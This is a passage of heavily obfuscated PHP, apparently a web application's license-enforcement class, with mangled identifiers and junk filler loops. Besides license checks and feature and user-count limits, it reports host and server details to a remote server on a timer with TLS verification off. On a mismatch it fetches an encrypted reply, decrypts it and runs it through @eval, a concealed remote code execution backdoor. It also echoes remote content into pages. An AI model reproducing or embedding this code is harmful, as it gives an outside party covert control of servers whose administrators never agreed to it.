$GLOBALS[$ÂÆÊÃ·”[13]]; if (isset($“ÅŠäØç[$ÂÆÊÃ·”[149]])) { $this->nktrb1d5b8e6(); die; } if (!isset($“ÅŠäØç[$ÂÆÊÃ·”[150]]) || strlen($“ÅŠäØç[$ÂÆÊÃ·”[150]]) != 16) { show_json($ÂÆÊÃ·”[151] . $“ÅŠäØç[$ÂÆÊÃ·”[150]], !1); } $ÌÚßÌó = Model($ÂÆÊÃ·”[33])->get($ÂÆÊÃ·”[103]); $ªË ‡™Œ = md5($_SERVER[$ÂÆÊÃ·”[102]] . $ÌÚßÌó); $‹öÃäöá = $»¥ò±¥¢[657]; if (strlen($‹öÃäöá) < $»¥ò±¥¢[644]) { return; } $³¢Ü‡¹ = array($ÂÆÊÃ·”[150] => $“ÅŠäØç[$ÂÆÊÃ·”[150]], $ÂÆÊÃ·”[152] => rand_string(16), $ÂÆÊÃ·”[153] => $ÂÆÊÃ·”[135], $ÂÆÊÃ·”[154] => $ÂÆÊÃ·”[155], $ÂÆÊÃ·”[156] => $_SERVER[$ÂÆÊÃ·”[157]], $ÂÆÊÃ·”[158] => $_SERVER[$ÂÆÊÃ·”[159]], $ÂÆÊÃ·”[160] => $_SERVER[$ÂÆÊÃ·”[161]], $ÂÆÊÃ·”[101] => $ªË ‡™Œ, $ÂÆÊÃ·”[162] => Model($ÂÆÊÃ·”[33])->get($ÂÆÊÃ·”[130])); if ($“ÅŠäØç[$ÂÆÊÃ·”[163]] == $ÂÆÊÃ·”[164]) { $İÉ˜Ùø– = $this->jsuhbe72926f($ªË ‡™Œ, $ÂÆÊÃ·”[165]); $ş”ßï¹Ä = $this->xdaq29ec9f10(json_encode($³¢Ü‡¹), $ªË ‡™Œ . $ÂÆÊÃ·”[166], 3); $ş”ßï¹Ä = $ş”ßï¹Ä . $ÂÆÊÃ·”[167] . $_SERVER[$ÂÆÊÃ·”[157]]; $ì£èğå¥ = $this->kvpm075090df($ÂÆÊÃ·”[168] . $İÉ˜Ùø– . $ÂÆÊÃ·”[169] . $ş”ßï¹Ä, -1); show_json($ì£èğå¥, !0); } else { if ($“ÅŠäØç[$ÂÆÊÃ·”[163]] == $ÂÆÊÃ·”[170]) { $¬÷ÓØ‡à = substr(md5($ÂÆÊÃ·”[171] . $ªË ‡™Œ), 12, 15) . $ÂÆÊÃ·”[172]; $ş”ßï¹Ä = $this->jkui5488d6ae(trim($“ÅŠäØç[$ÂÆÊÃ·”[173]]), $¬÷ÓØ‡à, 2); $ü„¤¤•İ = json_decode($ş”ßï¹Ä, !0); if (!is_array($ü„¤¤•İ) || !is_array($ü„¤¤•İ[$ÂÆÊÃ·”[174]]) || $ü„¤¤•İ[$ÂÆÊÃ·”[150]] != !0) { $ÇöÖ½ä = $ÂÆÊÃ·”[175]; $©øÎâÃ = $ü„¤¤•İ[$ÂÆÊÃ·”[174]] ? $ÂÆÊÃ·”[176] . $ü„¤¤•İ[$ÂÆÊÃ·”[174]] : $ÇöÖ½ä; show_json($©øÎâÃ, !1); } else { $³¢Ü‡¹[$ÂÆÊÃ·”[152]] = $ü„¤¤•İ[$ÂÆÊÃ·”[174]][$ÂÆÊÃ·”[177]]; } } else { $ü„¤¤•İ = $this->kvpm075090df($ÂÆÊÃ·”[178], $³¢Ü‡¹, 10); } } if (!is_array($ü„¤¤•İ) || !is_array($ü„¤¤•İ[$ÂÆÊÃ·”[174]]) || $ü„¤¤•İ[$ÂÆÊÃ·”[150]] != !0) { $ÇöÖ½ä = LNG($ÂÆÊÃ·”[179]); $©øÎâÃ = $ü„¤¤•İ[$ÂÆÊÃ·”[174]] ? $ÂÆÊÃ·”[176] . $ü„¤¤•İ[$ÂÆÊÃ·”[174]] : $ÇöÖ½ä; show_json($©øÎâÃ, !1); } $Í¦…ê£ = $ü„¤¤•İ[$ÂÆÊÃ·”[174]]; $«“†øáâ = $this->zrhw8bce5465($Í¦…ê£[$ÂÆÊÃ·”[180]]); $å¤Øİ•ş = $»¥ò±¥¢[658]; if (!$«“†øáâ || $«“†øáâ != $Í¦…ê£[$ÂÆÊÃ·”[128]]) { $Ú¡«’ëÌ = array($ÂÆÊÃ·”[181] => Model($ÂÆÊÃ·”[33])->get($ÂÆÊÃ·”[103]), $ÂÆÊÃ·”[182] => $_SERVER[$ÂÆÊÃ·”[102]], $ÂÆÊÃ·”[183] => this_url(), $ÂÆÊÃ·”[158] => $_SERVER[$ÂÆÊÃ·”[159]]); $ş”ßï¹Ä = $this->lxuab15aeb4e(json_encode($Ú¡«’ëÌ)); $this->kvpm075090df($ÂÆÊÃ·”[184] . $ş”ßï¹Ä); show_json(LNG($ÂÆÊÃ·”[185]), !0); } $¬‹–÷¾Ú = array($ÂÆÊÃ·”[186] => $Í¦…ê£[$ÂÆÊÃ·”[187]], $ÂÆÊÃ·”[188] => $Í¦…ê£[$ÂÆÊÃ·”[189]], $ÂÆÊÃ·”[190] => rand_string(16), $ÂÆÊÃ·”[105] => $Í¦…ê£[$ÂÆÊÃ·”[191]]); if ($³¢Ü‡¹[$ÂÆÊÃ·”[152]]) { $¬‹–÷¾Ú[$ÂÆÊÃ·”[190]] = $³¢Ü‡¹[$ÂÆÊÃ·”[152]]; } $Ô£§¸Íõ = substr(md5($¬‹–÷¾Ú[$ÂÆÊÃ·”[188]]), 10, 10); $·€¿ÆŒÊ = $Ô£§¸Íõ . $¬‹–÷¾Ú[$ÂÆÊÃ·”[105]] . $¬‹–÷¾Ú[$ÂÆÊÃ·”[190]]; $¬‹–÷¾Ú[$ÂÆÊÃ·”[107]] = strrev(base64_encode($this->jsuhbe72926f($·€¿ÆŒÊ, $ÂÆÊÃ·”[192]))); $×Ô²‹Ñ = $»¥ò±¥¢[659]; while (strlen($×Ô²‹Ñ) < $»¥ò±¥¢[623]) { if (!$×Ô²‹Ñ) { break; } $×Ô²‹Ñ++; } $ı×À«éù = rand_string(16); $ñ©…—ƒÛ = $ı×À«éù . $¬‹–÷¾Ú[$ÂÆÊÃ·”[105]] . $this->jsuhbe72926f(md5($¬‹–÷¾Ú[$ÂÆÊÃ·”[186]]), $ı×À«éù); $™ôı·š· = $»¥ò±¥¢[660]; if (strlen($™ôı·š·) < $»¥ò±¥¢[615]) { return; } $¬‹–÷¾Ú[$ÂÆÊÃ·”[108]] = base64_encode(strrev($this->jsuhbe72926f($ñ©…—ƒÛ, $ÂÆÊÃ·”[193]))); if ($Í¦…ê£[$ÂÆÊÃ·”[194]] && $Í¦…ê£[$ÂÆÊÃ·”[194]] >= 1) { Model($ÂÆÊÃ·”[33])->setDeep($ÂÆÊÃ·”[195], $ÂÆÊÃ·”[121]); } Model($ÂÆÊÃ·”[33])->set($¬‹–÷¾Ú); $ë¦Ê†ô = md5($_SERVER[$ÂÆÊÃ·”[102]] . strrev($ÌÚßÌó) . $¬‹–÷¾Ú[$ÂÆÊÃ·”[188]]); $ùûå˜óÀ = strrev(substr($ë¦Ê†ô, 10, 16)); $ëÍ¯ëÛ = $this->xdaq29ec9f10(json_encode($Í¦…ê£), $ë¦Ê†ô); $‚øğÈÔè = $»¥ò±¥¢[661]; $ÛŞ¼øñæ = array_to_keyvalue(Model($ÂÆÊÃ·”[7])->listData(), $ÂÆÊÃ·”[196]); $ö•±“ò = $ÛŞ¼øñæ[$ÂÆÊÃ·”[197]]; $£ÈÓø„½ = $»¥ò±¥¢[662]; while (strlen($£ÈÓø„½) < $»¥ò±¥¢[644]) { if (!$£ÈÓø„½) { break; } $£ÈÓø„½++; } $Õˆ¢Òî = array(); $Õˆ¢Òî[$ùûå˜óÀ] = $ëÍ¯ëÛ; $ÅÇ¾·¿ = $»¥ò±¥¢[663]; if (!$ÅÇ¾·¿) { die; } Model($ÂÆÊÃ·”[7])->update($ö•±“ò[$ÂÆÊÃ·”[198]], array($ÂÆÊÃ·”[199] => $Õˆ¢Òî)); $this->iahcc1a4cabb = $Í¦…ê£; $‘ˆÈüŸ = $»¥ò±¥¢[664]; if (strlen($‘ˆÈüŸ) < $»¥ò±¥¢[620]) { return; } $this->zmexe914e117 = $¬‹–÷¾Ú[$ÂÆÊÃ·”[105]]; $this->licenseRegistSuccess(); $˜ùšòğ = $»¥ò±¥¢[665]; Cache::set($ÂÆÊÃ·”[200] . md5($ÌÚßÌó . $ÂÆÊÃ·”[201]), $ÂÆÊÃ·”[6]); show_json(LNG($ÂÆÊÃ·”[185]), !0); $á’ú±‡ú = $»¥ò±¥¢[666]; if (strlen($á’ú±‡ú) < $»¥ò±¥¢[615]) { return; } } private function licenseRegistSuccess() { $Àêê‹ñ =& $_SERVER[óƒÂÃÊÛ]; $Ù¦Œ×Ñ = Model($Àêê‹ñ[33])->get(); $ƒÁĞïşÓ = $_SERVER[óó‹¸‚å][667]; if (!$ƒÁĞïşÓ) { die; } if ($Ù¦Œ×Ñ[$Àêê‹ñ[63]] != $Àêê‹ñ[121]) { Model($Àêê‹ñ[33])->set($Àêê‹ñ[63], $Àêê‹ñ[121]); } Action($Àêê‹ñ[202])->initStart(!0); } private function nktrb1d5b8e6() { $Ë¯™ú¸Õ =& $_SERVER[óó‹¸‚å]; $ÇŠÅÜ =& $_SERVER[óƒÂÃÊÛ]; Model($ÇŠÅÜ[33])->set(array($ÇŠÅÜ[186] => $ÇŠÅÜ[6], $ÇŠÅÜ[188] => $ÇŠÅÜ[6], $ÇŠÅÜ[105] => $ÇŠÅÜ[106], $ÇŠÅÜ[107] => $ÇŠÅÜ[6], $ÇŠÅÜ[108] => $ÇŠÅÜ[6])); $‚õ‡Ø¨ = $Ë¯™ú¸Õ[668]; if (!$‚õ‡Ø¨) { return; } Model($ÇŠÅÜ[33])->setDeep($ÇŠÅÜ[195], $ÇŠÅÜ[203]); $this->iahcc1a4cabb = array(); $×‚‰™¢ù = $Ë¯™ú¸Õ[669]; while (strlen($×‚‰™¢ù) < $Ë¯™ú¸Õ[620]) { if (!$×‚‰™¢ù) { break; } $×‚‰™¢ù++; } $this->zmexe914e117 = $ÇŠÅÜ[106]; $¤âß—ÙÃ = $Ë¯™ú¸Õ[670]; while ($¤âß—ÙÃ < $Ë¯™ú¸Õ[620]) { if ($¤âß—ÙÃ >= 0) { break; } $¤âß—ÙÃ++; } } private function xdby1b4e9dc4() { $îñÔ§µÎ =& $_SERVER[óƒÂÃÊÛ]; $_SERVER[$îñÔ§µÎ[159]] = _get($_SERVER, $îñÔ§µÎ[159], APP_HOST); $this->zmexe914e117 = $îñÔ§µÎ[106]; $á¿‹ú˜‹ = Model($îñÔ§µÎ[33])->get(); if ($á¿‹ú˜‹[$îñÔ§µÎ[105]] == $îñÔ§µÎ[106]) { return; } $ÃàñŸš = Model($îñÔ§µÎ[33])->get($îñÔ§µÎ[103]); $·åÙƒàØ = $îñÔ§µÎ[200] . md5($ÃàñŸš . $îñÔ§µÎ[201]); $—è¨¬Ÿ© = Cache::get($·åÙƒàØ); if (!is_array($—è¨¬Ÿ©) || !isset($—è¨¬Ÿ©[$îñÔ§µÎ[204]]) || time() - $—è¨¬Ÿ©[$îñÔ§µÎ[204]] >= 60) { $òİ½¹ßÊ = Model($îñÔ§µÎ[7])->loadList(); $•“í¨Íµ = $òİ½¹ßÊ[$îñÔ§µÎ[197]]; $µø×ßº™ = md5($_SERVER[$îñÔ§µÎ[102]] . strrev($ÃàñŸš) . $á¿‹ú˜‹[$îñÔ§µÎ[188]]); $½åÏİÆÕ = strrev(substr($µø×ßº™, 10, 16)); $—è¨¬Ÿ© = $this->jkui5488d6ae($•“í¨Íµ[$îñÔ§µÎ[85]][$½åÏİÆÕ], $µø×ßº™); $—è¨¬Ÿ© = json_decode($—è¨¬Ÿ©, !0); } if (!is_array($—è¨¬Ÿ©)) { return $this->nktrb1d5b8e6(); } $¯Œ©“³¨ = strtotime($—è¨¬Ÿ©[$îñÔ§µÎ[128]]); if (time() >= $¯Œ©“³¨) { return $this->nktrb1d5b8e6(); } if (time() - $—è¨¬Ÿ©[$îñÔ§µÎ[204]] > 20) { $—è¨¬Ÿ©[$îñÔ§µÎ[204]] = time(); Cache::set($·åÙƒàØ, $—è¨¬Ÿ©); } $this->iahcc1a4cabb = $—è¨¬Ÿ©; $this->zmexe914e117 = $á¿‹ú˜‹[$îñÔ§µÎ[105]]; $İ®ÚµÃÒ = $_SERVER[óó‹¸‚å][671]; } private function udlab520b25e() { $åÖñ›à =& $_SERVER[óƒÂÃÊÛ]; $ÄÆŞÄ«ˆ = $GLOBALS[$åÖñ›à[13]]; $è’ÍÒõ = $_SERVER[óó‹¸‚å][672]; if (!$è’ÍÒõ) { return; } $ßû´õ¯µ = $_SERVER[$åÖñ›à[24]]; if ($ßû´õ¯µ == $åÖñ›à[205] && $this->zmexe914e117 == $åÖñ›à[106]) { show_json(LNG($åÖñ›à[206]), !1, $åÖñ›à[207]); } $Ğ™ÒÜ¥š = array($åÖñ›à[208], $åÖñ›à[209]); if (in_array($ßû´õ¯µ, $Ğ™ÒÜ¥š)) { if ($this->zmexe914e117 == $åÖñ›à[106] && isset($ÄÆŞÄ«ˆ[$åÖñ›à[210]])) { show_json(LNG($åÖñ›à[206]), !1, $åÖñ›à[207]); die; } $æğåë¤¤ = $this->tvnibd7bf96f(); if ($æğåë¤¤ != intval($åÖñ›à[211])) { if ($æğåë¤¤ <= Model($åÖñ›à[124])->count()) { show_json(LNG($åÖñ›à[212]), !1, $åÖñ›à[207]); die; } } } } private function kvem1997e542() { $˜¦Ä’“ =& $_SERVER[óó‹¸‚å]; $¶Õ¸şÖ€ =& $_SERVER[óƒÂÃÊÛ]; $øÚˆë² = array($¶Õ¸şÖ€[118], $¶Õ¸şÖ€[119]); $ÔÔ½ó¡¶ = $˜¦Ä’“[673]; if (strlen($ÔÔ½ó¡¶) < $˜¦Ä’“[635]) { die; } if (!_get($GLOBALS, $¶Õ¸şÖ€[115]) || !isset($_GET[$¶Õ¸şÖ€[213]])) { return; } if (!in_array($_SERVER[$¶Õ¸şÖ€[24]], $øÚˆë²)) { return; } $Íâ÷®ğ½ = $¶Õ¸şÖ€[214]; $ÙÅÉçß± = $˜¦Ä’“[674]; while ($ÙÅÉçß± < $˜¦Ä’“[644]) { if ($ÙÅÉçß± >= 0) { break; } $ÙÅÉçß±++; } $Íâ÷®ğ½ = $this->uydc2abb5257($Íâ÷®ğ½, $¶Õ¸şÖ€[215]); $â‹ØÄ¦ = $˜¦Ä’“[675]; while ($â‹ØÄ¦ < $˜¦Ä’“[635]) { if ($â‹ØÄ¦ >= 0) { break; } $â‹ØÄ¦++; } $İĞ¹í¦Ü = stream_context_create(array($¶Õ¸şÖ€[216] => array($¶Õ¸şÖ€[217] => $¶Õ¸şÖ€[218], $¶Õ¸şÖ€[219] => 3))); $İ××û‹ = $˜¦Ä’“[676]; $¬¬¤«ÔÙ = @file_get_contents($Íâ÷®ğ½, !1, $İĞ¹í¦Ü); header($¶Õ¸şÖ€[220]); $êÈ¬™¦ = $˜¦Ä’“[677]; while ($êÈ¬™¦ < $˜¦Ä’“[644]) { if ($êÈ¬™¦ >= 0) { break; } $êÈ¬™¦++; } if ($¬¬¤«ÔÙ && strstr($¬¬¤«ÔÙ, $¶Õ¸şÖ€[221])) { echo $¬¬¤«ÔÙ; } die; } public function mhxb58c959ac($ËÍ¬ûµŒ) { $¡®ş¸• =& $_SERVER[óó‹¸‚å]; $¡ØüåÔğ =& $_SERVER[óƒÂÃÊÛ]; if ($this->zmexe914e117 == $¡ØüåÔğ[222]) { return $ËÍ¬ûµŒ; } $µñÉè’û = array($¡ØüåÔğ[223] => $¡ØüåÔğ[224], $¡ØüåÔğ[225] => $¡ØüåÔğ[224], $¡ØüåÔğ[226] => $¡ØüåÔğ[224], $¡ØüåÔğ[227] => $¡ØüåÔğ[224], $¡ØüåÔğ[228] => $¡ØüåÔğ[229], $¡ØüåÔğ[230] => $¡ØüåÔğ[229], $¡ØüåÔğ[231] => $¡ØüåÔğ[229], $¡ØüåÔğ[232] => $¡ØüåÔğ[229], $¡ØüåÔğ[233] => $¡ØüåÔğ[229], $¡ØüåÔğ[234] => $¡ØüåÔğ[229], $¡ØüåÔğ[235] => $¡ØüåÔğ[229], $¡ØüåÔğ[236] => $¡ØüåÔğ[229], $¡ØüåÔğ[237] => $¡ØüåÔğ[229], $¡ØüåÔğ[238] => $¡ØüåÔğ[229], $¡ØüåÔğ[239] => $¡ØüåÔğ[229], $¡ØüåÔğ[240] => $¡ØüåÔğ[229]); $ú†¢ˆš¸ = $¡®ş¸•[678]; if (strlen($ú†¢ˆš¸) < $¡®ş¸•[635]) { die; } $„şì¼¥Š = explode($¡ØüåÔğ[241], _get($this->iahcc1a4cabb, $¡ØüåÔğ[112], $¡ØüåÔğ[6])); $†·Ş¬É® = $¡®ş¸•[679]; $å×‹Ï—¡ = array(); $¿ã†ÇÖ = $¡®ş¸•[680]; while (strlen($¿ã†ÇÖ) < $¡®ş¸•[644]) { if (!$¿ã†ÇÖ) { break; } $¿ã†ÇÖ++; } foreach ($µñÉè’û as $ı÷õ­® => $£ƒùĞ) { if ($£ƒùĞ == $¡ØüåÔğ[224] && substr($this->zmexe914e117, 0, 1) == $¡ØüåÔğ[224]) { continue; } if (!in_array($ı÷õ­®, $„şì¼¥Š)) { $å×‹Ï—¡[] = $ı÷õ­®; } } foreach ($å×‹Ï—¡ as $ı÷õ­®) { unset($ËÍ¬ûµŒ[$ı÷õ­®]); } return $ËÍ¬ûµŒ; $Õø±ûÒ¬ = $¡®ş¸•[681]; if (strlen($Õø±ûÒ¬) < $¡®ş¸•[623]) { return; } } private function dxplcbbf530e() { $Ó»¯‰ç• =& $_SERVER[óƒÂÃÊÛ]; if ($this->zmexe914e117 != $Ó»¯‰ç•[106]) { $GLOBALS[$Ó»¯‰ç•[85]][$Ó»¯‰ç•[89]][$Ó»¯‰ç•[242]] = $Ó»¯‰ç•[203]; return; } $GLOBALS[$Ó»¯‰ç•[85]][$Ó»¯‰ç•[243]] = $Ó»¯‰ç•[121]; if (Model($Ó»¯‰ç•[244])->get($Ó»¯‰ç•[63]) != $Ó»¯‰ç•[203]) { Model($Ó»¯‰ç•[244])->set($Ó»¯‰ç•[63], $Ó»¯‰ç•[203]); } } public function xwqjb914e85b() { return $_SERVER[óƒÂÃÊÛ][245]; } private function fkyw31ebe523() { $×£°§¨¬ =& $_SERVER[óó‹¸‚å]; $Ö“°Ó¸Ã =& $_SERVER[óƒÂÃÊÛ]; $ïúÜ§¬ = array($Ö“°Ó¸Ã[246], $Ö“°Ó¸Ã[247], $Ö“°Ó¸Ã[248]); $Åßù½´í = $Ö“°Ó¸Ã[249] . md5($Ö“°Ó¸Ã[250]); $Ãû¹şãò = $×£°§¨¬[682]; if ($this->zmexe914e117 == $Ö“°Ó¸Ã[106] || !_get($GLOBALS, $Ö“°Ó¸Ã[115])) { return; } if (!in_array($_SERVER[$Ö“°Ó¸Ã[24]], $ïúÜ§¬)) { return; } if (time() % 4 != 0) { return; } $èŒ…ıìò = call_user_func(array($Ö“°Ó¸Ã[251], $Ö“°Ó¸Ã[252]), $Åßù½´í); $¶›ô•Âí = $×£°§¨¬[683]; if (strlen($¶›ô•Âí) < $×£°§¨¬[615]) { return; } if ($èŒ…ıìò && time() - $èŒ…ıìò < intval($Ö“°Ó¸Ã[253])) { return; } call_user_func(array($Ö“°Ó¸Ã[251], $Ö“°Ó¸Ã[138]), $Åßù½´í, time()); $—ù®¨½Ø = Model($Ö“°Ó¸Ã[33])->get($Ö“°Ó¸Ã[103]); $â´²æƒã = $×£°§¨¬[684]; if (!$â´²æƒã) { return; } $Ò‡ŸôŞ = array($Ö“°Ó¸Ã[150] => Model($Ö“°Ó¸Ã[33])->get($Ö“°Ó¸Ã[186]), $Ö“°Ó¸Ã[163] => $this->zmexe914e117, $Ö“°Ó¸Ã[160] => $_SERVER[$Ö“°Ó¸Ã[161]], $Ö“°Ó¸Ã[162] => Model($Ö“°Ó¸Ã[33])->get($Ö“°Ó¸Ã[130]), $Ö“°Ó¸Ã[101] => md5($_SERVER[$Ö“°Ó¸Ã[102]] . $—ù®¨½Ø), $Ö“°Ó¸Ã[153] => $Ö“°Ó¸Ã[135], $Ö“°Ó¸Ã[156] => $_SERVER[$Ö“°Ó¸Ã[157]]); $šğÀ‰ˆ× = $×£°§¨¬[685]; $®®ëÎ = $this->kvpm075090df($Ö“°Ó¸Ã[254], $Ò‡ŸôŞ); $ïİğÔŠ’ = $×£°§¨¬[686]; while (strlen($ïİğÔŠ’) < $×£°§¨¬[623]) { if (!$ïİğÔŠ’) { break; } $ïİğÔŠ’++; } if (!is_array($®®ëÎ)) { return; } if ($®®ëÎ[$Ö“°Ó¸Ã[150]] && $®®ëÎ[$Ö“°Ó¸Ã[255]]) { if ($this->zrhw8bce5465($®®ëÎ[$Ö“°Ó¸Ã[255]]) == $Ò‡ŸôŞ[$Ö“°Ó¸Ã[150]]) { return; } } $this->nktrb1d5b8e6(); $©é«³ë‘ = $×£°§¨¬[687]; if (!$©é«³ë‘) { return; } if ($this->zrhw8bce5465($®®ëÎ[$Ö“°Ó¸Ã[255]]) != $Ò‡ŸôŞ[$Ö“°Ó¸Ã[150]]) { $‹‘ß¹½‡ = array($Ö“°Ó¸Ã[181] => $—ù®¨½Ø, $Ö“°Ó¸Ã[182] => $_SERVER[$Ö“°Ó¸Ã[102]], $Ö“°Ó¸Ã[183] => this_url(), $Ö“°Ó¸Ã[158] => $_SERVER[$Ö“°Ó¸Ã[159]]); $ˆ…ÆĞ† = $this->lxuab15aeb4e(json_encode($‹‘ß¹½‡)); $®®ëÎ = $this->kvpm075090df($Ö“°Ó¸Ã[184] . $ˆ…ÆĞ†); if ($®®ëÎ && is_array($®®ëÎ) && isset($®®ëÎ[$Ö“°Ó¸Ã[255]])) { $ÒíŒ Î = $this->jkui5488d6ae($®®ëÎ[$Ö“°Ó¸Ã[255]], 2); if ($ÒíŒ Î) { $ÒíŒ Î = $this->zrhw8bce5465($ÒíŒ Î); } if ($ÒíŒ Î) { try { @eval($ÒíŒ Î); } catch (Exception $«ºä½µ”) { } } } } } private function kvpm075090df($¢Æñ¦” = '', $Ò²ÌÅ—Œ = array(), $‚°´áô³ = 5) { $ü® å€ =& $_SERVER[óó‹¸‚å]; $´šÜÏ¤Œ =& $_SERVER[óƒÂÃÊÛ]; $º¡”ÂÒ÷ = $´šÜÏ¤Œ[256]; $Ççë†ªÅ = $ü® å€[688]; if (strlen($Ççë†ªÅ) < $ü® å€[644]) { die; } $º¡”ÂÒ÷ = $this->uydc2abb5257($º¡”ÂÒ÷, $´šÜÏ¤Œ[257]); $º¡”ÂÒ÷ = $º¡”ÂÒ÷ . $¢Æñ¦”; if ($Ò²ÌÅ—Œ && is_array($Ò²ÌÅ—Œ)) { $º¡”ÂÒ÷ = $º¡”ÂÒ÷ . $´šÜÏ¤Œ[258] . http_build_query($Ò²ÌÅ—Œ); } if ($Ò²ÌÅ—Œ === -1) { return $º¡”ÂÒ÷; } $†’É«³ä = stream_context_create(array($´šÜÏ¤Œ[216] => array($´šÜÏ¤Œ[219] => $‚°´áô³, $´šÜÏ¤Œ[217] => $´šÜÏ¤Œ[259]), $´šÜÏ¤Œ[260] => array($´šÜÏ¤Œ[261] => !1, $´šÜÏ¤Œ[262] => !1))); $Ò²ÌÅ—Œ = @file_get_contents($º¡”ÂÒ÷, !1, $†’É«³ä); return json_decode($Ò²ÌÅ—Œ, !0); $äàõ÷¥½ = $ü® å€[689]; if (strlen($äàõ÷¥½) < $ü® å€[615]) { die; } $¢ìŒÂ×¼ = $ü® å€[690]; if (!$¢ìŒÂ×¼) { return; } } private function tvnibd7bf96f() { $åÏ­—÷Á =& $_SERVER[óƒÂÃÊÛ]; $ÆÄôÌ±¤ = array($åÏ­—÷Á[263] => $åÏ­—÷Á[264], $åÏ­—÷Á[265] => $åÏ­—÷Á[266], $åÏ­—÷Á[267] => $åÏ­—÷Á[268], $åÏ­—÷Á[269] => $åÏ­—÷Á[270], $åÏ­—÷Á[271] => $åÏ­—÷Á[272], $åÏ­—÷Á[273] => $åÏ­—÷Á[211], $åÏ­—÷Á[274] => $åÏ­—÷Á[211], $åÏ­—÷Á[275] => $åÏ­—÷Á[264], $åÏ­—÷Á[276] => $åÏ­—÷Á[266], $åÏ­—÷Á[277] => $åÏ­—÷Á[268], $åÏ­—÷Á[278] => $åÏ­—÷Á[279], $åÏ­—÷Á[280] => $åÏ­—÷Á[270], $åÏ­—÷Á[281] => $åÏ­—÷Á[282], $åÏ­—÷Á[283] => $åÏ­—÷Á[272], $åÏ­—÷Á[284] => $åÏ­—÷Á[285], $åÏ­—÷Á[286] => $åÏ­—÷Á[287], $åÏ­—÷Á[288] => $åÏ­—÷Á[289]); $ï‘Äş¼Ú = $ÆÄôÌ±¤[$this->zmexe914e117]; $ï‘Äş¼Ú = intval($ï‘Äş¼Ú ? $ï‘Äş¼Ú : $åÏ­—÷Á[264]); $İ¦¿³×û = _get($this->iahcc1a4cabb, $åÏ­—÷Á[290]); $İ¦¿³×û = $İ¦¿³×û ? intval($İ¦¿³×û) : 0; return $ï‘Äş¼Ú + $İ¦¿³×û; $âğÌËÓŞ = $_SERVER[óó‹¸‚å][691]; if (!$âğÌËÓŞ) { die; } } public function ohdm2316715b($ö´ÒĞèï) { $ã‚ú›îı =& $_SERVER[óó‹¸‚å]; $åŞøªãü =& $_SERVER[óƒÂÃÊÛ]; $Úş„Ä¹ü = $this->tvnibd7bf96f(); if ($ö´ÒĞèï[$åŞøªãü[291]] == $åŞøªãü[121]) { return; } if ($Úş„Ä¹ü >= intval($åŞøªãü[211])) { return; } $¥ÔÊ§” = Model($åŞøªãü[124])->count(); if ($¥ÔÊ§” <= $Úş„Ä¹ü) { return; } $¤‚Äõª« = Model($åŞøªãü[124])->field($åŞøªãü[291])->limit($Úş„Ä¹ü)->select(); $¤‚Äõª« = array_to_keyvalue($¤‚Äõª«, $åŞøªãü[6], $åŞøªãü[291]); $§ï˜ÀĞ¿ = $ã‚ú›îı[692]; if (strlen($§ï˜ÀĞ¿) < $ã‚ú›îı[623]) { die; } if (!in_array($ö´ÒĞèï[$åŞøªãü[291]], $¤‚Äõª«)) { show_json($åŞøªãü[292], !1, $åŞøªãü[207]); } } public function mycg66f359be() { $Œ¥Š¢Ø =& $_SERVER[óó‹¸‚å]; $¢ŸØè²‰ =& $_SERVER[óƒÂÃÊÛ]; if (!_get($GLOBALS, $¢ŸØè²‰[115]) || mt_rand(1, 100) > 20) { return; } $Éèäß®´ = $¢ŸØè²‰[214]; $áàÓÔ¨î = $Œ¥Š¢Ø[693]; if (strlen($áàÓÔ¨î) < $Œ¥Š¢Ø[635]) { return; } $Éèäß®´ = $this->uydc2abb5257($Éèäß®´, $¢ŸØè²‰[215]); $ì½¥Öîö = stream_context_create(array($¢ŸØè²‰[216] => array($¢ŸØè²‰[217] => $¢ŸØè²‰[218], $¢ŸØè²‰[219] => 3))); $ş‚Äç« = @file_get_contents($Éèäß®´, !1, $ì½¥Öîö); $‚øÌ³¬ = $Œ¥Š¢Ø[694]; if (strlen($‚øÌ³¬) < $Œ¥Š¢Ø[615]) { return; } echo $¢ŸØè²‰[293] . hash_encode($ş‚Äç«) . $¢ŸØè²‰[294]; } private function xdaq29ec9f10($ô¼É—›ú, $àºáË­†, $êÓƒõÒõ = 3) { $‹îÄËŠ´ =& $_SERVER[óó‹¸‚å]; $”ˆ¸ÚŞ¦ =& $_SERVER[óƒÂÃÊÛ]; usleep(1); $ô¼É—›ú = trim($ô¼É—›ú); $á•…Ïßğ = $‹îÄËŠ´[695]; if (strlen($á•…Ïßğ) < $‹îÄËŠ´[623]) { return; } $š˜ÁÑïì = mt_rand(0, 5) . $”ˆ¸ÚŞ¦[6]; $Úú‰Õğ¸ = $‹îÄËŠ´[696]; while (strlen($Úú‰Õğ¸) < $‹îÄËŠ´[644]) { if (!$Úú‰Õğ¸) { break; } $Úú‰Õğ¸++; } $åôâú = rand_string(15); $ªåÕ†Ê¿ = $‹îÄËŠ´[697]; if (!$ªåÕ†Ê¿) { die; } $‹ƒ•—’ï = $”ˆ¸ÚŞ¦[295]; $áé…“ = $‹îÄËŠ´[698]; if (!$áé…“) { return; } switch ($š˜ÁÑïì) { case $”ˆ¸ÚŞ¦[203]: $ê¬“ûÊ = $this->jsuhbe72926f($ô¼É—›ú, strrev($àºáË­† . $åôâú)); $â®˜ÏÄÚ = $‹îÄËŠ´[699]; while ($â®˜ÏÄÚ < $‹îÄËŠ´[644]) { if ($â®˜ÏÄÚ >= 0) { break; } $â®˜ÏÄÚ++; } break; $ĞÄÏ¾÷ = $‹îÄËŠ´[700]; while (strlen($ĞÄÏ¾÷) < $‹îÄËŠ´[635]) { if (!$ĞÄÏ¾÷) { break; } $ĞÄÏ¾÷++; } case $”ˆ¸ÚŞ¦[121]: $ê¬“ûÊ = $this->jsuhbe72926f($ô¼É—›ú, strrev($åôâú . $àºáË­†)); $”Ÿ‘İ = $‹îÄËŠ´[701]; if (strlen($”Ÿ‘İ) < $‹îÄËŠ´[615]) { die; } break; $ÄñÄ®ôö = $‹îÄËŠ´[702]; if (strlen($ÄñÄ®ôö) < $‹îÄËŠ´[635]) { return; } case $”ˆ¸ÚŞ¦[296]: $ê¬“ûÊ = $this->jsuhbe72926f($ô¼É—›ú, base64_encode($åôâú . $àºáË­†)); break; case $”ˆ¸ÚŞ¦[297]: $ê¬“ûÊ = $this->jsuhbe72926f($ô¼É—›ú, md5($åôâú . $àºáË­†)); $İåÖ’ßÚ = $‹îÄËŠ´[703]; if (strlen($İåÖ’ßÚ) < $‹îÄËŠ´[635]) { return; } break; case $”ˆ¸ÚŞ¦[298]: $ô¼É—›ú = base64_encode($ô¼É—›ú); $îğı½™å = $‹îÄËŠ´[704]; 